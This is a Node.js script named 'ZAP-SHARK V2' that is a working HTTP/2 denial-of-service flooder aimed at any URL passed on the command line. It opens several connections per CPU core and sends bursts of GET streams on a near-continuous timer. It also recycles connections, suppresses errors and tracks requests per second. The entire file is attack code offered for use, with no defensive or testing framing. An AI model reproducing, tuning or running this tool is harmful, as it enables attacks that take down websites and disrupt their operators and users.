const http2 = require('http2');
const { cpus } = require('os');

class ZAPSHARK_V2_COREPOWER {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // CORE UTILIZATION
        this.coreCount = cpus().length;
        this.workers = [];
        
        // NETWORK OPTIMIZATION
        this.connectionsPerCore = 5;
        this.totalConnections = this.coreCount * this.connectionsPerCore;
        
        // PERFORMANCE
        this.peakRPS = 0;
        this.lastDisplayUpdate = Date.now();
        
        this.attackInterval = null;
        this.displayInterval = null;
    }

    // === CORE WORKER SYSTEM ===
    createWorker(workerId) {
        const connections = [];
        
        // CREATE CONNECTIONS FOR THIS WORKER
        for (let i = 0; i < this.connectionsPerCore; i++) {
            try {
                const client = http2.connect(this.targetUrl, {
                    maxSessionMemory: 65536,
                    maxDeflateDynamicTableSize: 4294967295
                });
                
                client.setMaxListeners(1000);
                client.on('error', () => {});
                
                connections.push(client);
            } catch (err) {
                // SILENT FAIL
            }
        }
        
        return {
            id: workerId,
            connections,
            requestCount: 0
        };
    }

    initializeWorkers() {
        console.log(`[+] Using ${this.coreCount} CPU cores`);
        console.log(`[+] Creating ${this.totalConnections} total connections`);
        
        for (let i = 0; i < this.coreCount; i++) {
            const worker = this.createWorker(i);
            this.workers.push(worker);
        }
        
        console.log(`[+] ${this.workers.reduce((sum, w) => sum + w.connections.length, 0)} connections established`);
    }

    // === MAX CORE ATTACK ===
    workerAttack(worker) {
        if (!worker || worker.connections.length === 0) return 0;
        
        let requestsThisTick = 0;
        
        // EACH CONNECTION SENDS MULTIPLE STREAMS
        worker.connections.forEach(client => {
            for (let i = 0; i < 10; i++) { // 10 streams per connection
                try {
                    const req = client.request({
                        ':method': 'GET',
                        ':path': '/'
                    });
                    
                    req.on('response', () => {
                        try { req.destroy(); } catch (e) {}
                    });
                    
                    req.on('error', () => {
                        try { req.destroy(); } catch (e) {}
                    });
                    
                    req.on('close', () => {
                        this.totalRequests++;
                        this.requestsSinceLastCalc++;
                        worker.requestCount++;
                        requestsThisTick++;
                    });
                    
                    req.end();
                    
                } catch (err) {
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                    requestsThisTick++;
                }
            }
        });
        
        return requestsThisTick;
    }

    // === ALL CORES ATTACK ===
    attackWithAllCores() {
        // ATTACK WITH ALL WORKERS SIMULTANEOUSLY
        this.workers.forEach(worker => {
            this.workerAttack(worker);
        });
    }

    // === RAPID CONNECTION REFRESH ===
    refreshConnections() {
        // REFRESH 10% OF CONNECTIONS EVERY SECOND
        this.workers.forEach(worker => {
            const refreshCount = Math.ceil(worker.connections.length * 0.1);
            
            for (let i = 0; i < refreshCount; i++) {
                const index = Math.floor(Math.random() * worker.connections.length);
                try {
                    worker.connections[index].destroy();
                    
                    // CREATE NEW CONNECTION
                    const newClient = http2.connect(this.targetUrl, {
                        maxSessionMemory: 65536
                    });
                    newClient.setMaxListeners(1000);
                    newClient.on('error', () => {});
                    
                    worker.connections[index] = newClient;
                } catch (err) {}
            }
        });
    }

    // === RPS CALCULATION ===
    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.peakRPS = Math.max(this.peakRPS, this.currentRPS);
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    // === SIMPLE LOGGING ===
    updateDisplay() {
        this.calculateRPS();
        
        // OVERWRITE ONLY - NO SPAM
        process.stdout.write(`\rSHARK-TRS — ${this.totalRequests}`);
    }

    // === MAIN ===
    start() {
        console.log('=== ZAP-SHARK V2 | CORE POWER ===');
        console.log('Strategy: Use all CPU cores + WiFi');
        console.log('='.repeat(40));
        
        this.initializeWorkers();
        
        setTimeout(() => {
            console.log('[+] MAXIMUM ATTACK STARTED');
            
            // MAIN ATTACK LOOP (HIGH FREQUENCY)
            this.attackInterval = setInterval(() => {
                this.attackWithAllCores();
            }, 0.01); // 10 MICROSECONDS
            
            // CONNECTION REFRESH
            setInterval(() => {
                this.refreshConnections();
            }, 1000);
            
            // DISPLAY UPDATE (0.1s)
            this.displayInterval = setInterval(() => {
                this.updateDisplay();
            }, 100);
            
        }, 2000);
        
        process.on('SIGINT', () => {
            const runtime = (Date.now() - this.startTime) / 1000;
            const avgRPS = this.totalRequests / runtime;
            
            console.log('\n\n=== FINAL STATS ===');
            console.log(`Total Requests: ${this.totalRequests.toLocaleString()}`);
            console.log(`Peak RPS: ${this.peakRPS.toFixed(1)}`);
            console.log(`Average RPS: ${avgRPS.toFixed(1)}`);
            console.log(`Runtime: ${runtime.toFixed(1)}s`);
            console.log(`Cores Used: ${this.coreCount}`);
            console.log(`Connections: ${this.totalConnections}`);
            console.log('='.repeat(40));
            
            this.running = false;
            clearInterval(this.attackInterval);
            clearInterval(this.displayInterval);
            
            this.workers.forEach(worker => {
                worker.connections.forEach(client => {
                    try { client.destroy(); } catch (e) {}
                });
            });
            
            process.exit(0);
        });
    }
}

// USAGE
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node zap-shark-v2.js https://target.com');
    process.exit(1);
}

const shark = new ZAPSHARK_V2_COREPOWER(target);
shark.start();
